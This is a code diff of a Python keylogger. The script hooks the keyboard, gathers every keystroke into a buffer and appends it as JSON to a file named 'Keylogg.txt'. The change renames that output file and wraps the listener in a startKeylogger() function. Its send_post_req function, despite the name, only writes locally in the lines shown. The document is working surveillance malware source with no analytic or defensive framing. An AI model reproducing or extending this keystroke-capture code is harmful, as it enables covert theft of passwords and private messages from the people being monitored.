@@ -11,7 +11,7 @@ def send_post_req():
     global text
     try:
         payload = json.dumps({"keyboardData" : text})
-        with open("test.txt", "a", encoding="utf-8") as f:
+        with open("Keylogg.txt", "a", encoding="utf-8") as f:
             f.write(payload + "\n")
         
         text = ""
@@ -20,6 +20,8 @@ def send_post_req():
     except Exception as e:
         print(e)
         print("Couldn't complete request!")
+
+
 
 def on_press(key):
     global text
@@ -43,7 +45,8 @@ def on_press(key):
     else:
         text += str(key).strip("'")
 
-with keyboard.Listener(
-    on_press=on_press) as listener:
-    send_post_req()
-    listener.join()
+
+def startKeylogger():
+    with keyboard.Listener(on_press=on_press) as listener:
+        send_post_req()
+        listener.join()
